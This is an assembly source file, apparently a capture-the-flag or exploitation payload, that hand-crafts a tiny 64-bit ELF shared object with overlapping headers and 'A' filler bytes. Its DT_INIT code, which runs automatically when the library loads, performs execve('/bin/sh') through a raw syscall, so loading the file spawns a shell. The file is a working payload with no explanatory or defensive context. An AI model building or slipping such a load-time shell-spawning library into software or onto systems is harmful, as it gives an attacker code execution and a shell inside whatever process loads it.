BITS 64

ehdr:                                               ; Elf32_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
null_bytes:
            dq      0
            dw      3                               ;   e_type
            dw      0x3E                            ;   e_machine
            dd      1                               ;   e_version
;; binsh:
            ;; dq      0x68732f6e69622f                ;   p_paddr
            ;; dq      program_headers - $$            ;   e_phoff
            ;; dq      0                               ;   e_shoff
            ;; dd      0                               ;   e_flags
            ;; dw      ehdrsize                        ;   e_ehsize
            ;; dw      phdrsize                        ;   e_phentsize
            ;; dw      2                               ;   e_phnum
            ;; dw      0x4141                          ;   e_shentsize
            ;; dw      0x4141                          ;   e_shnum
            ;; dw      0x4141                          ;   e_shstrndx

ehdrsize      equ     $ - ehdr

program_headers:

; ======================================================================================
; PT_LOAD PROGRAM HEADER
; ======================================================================================


    dd      2                       ; p_type (PT_DYNAMIC)
    dd      7                       ; p_flags
    dq      program_headers - $$ ; p_offset
    dq      dynamic_section         ; p_vaddr
    dq      0x0038414141414141      ; p_paddr
    dq      0x4141414141410002      ; p_filesz
    dq      INIT_len                ; p_memsz
    dq      0x1000

phdrsize      equ     $ - program_headers

; ======================================================================================
; PT_DYNAMIC PROGRAM HEADER
; ======================================================================================

    dd      1                       ; p_type (PT_LOAD)
    dd      7                       ; p_flags
    ;; dq      INIT                    ; p_offset

binsh:
    dq      0x68732f6e69622f                ;   p_paddr
    dq      INIT                    ; p_vaddr


    ; The INIT section replaces these 24 bytes
    ;dq      0x4141414141414141      ; p_paddr
    ;dq      0x4141414141414141      ; p_filesz
    ;dq      0x4141414141414141      ; p_memsz

INIT:
    lea rdi, [rel binsh]        ; By putting binsh elsewhere we save 8 bytes here
    ;mov rdi, 0x68732f6e69622f
    ;push   rdi
    ;push   rsp
    ;pop    rdi

    ;mov [rel argv], rdi
    ;lea rsi, [rel argv]
    push  0
    push  rdi
    push  rsp
    pop   rsi

    push  0x3b
    pop    rax
    cdq
	syscall
dd      0x41424344        ; p_align
dw  0x1112
dw 0x1000

    

INIT_len    equ     $-INIT
_rep_times  equ     24-INIT_len

    ;times _rep_times db 0
    ;dq      0x1                  ; p_align


; ======================================================================================
; DYNAMIC array
; ======================================================================================

dynamic_section:    ; _DYNAMIC[]
    dq 12           ; DT_INIT
    dq INIT

    dq 5            ; DT_STRTAB	5		/* Address of string table */
    dq null_bytes

    dq 6            ; DT_SYMTAB	6		/* Address of symbol table */
    dq null_bytes

    ; Don't need: STRSZ, SYMENT
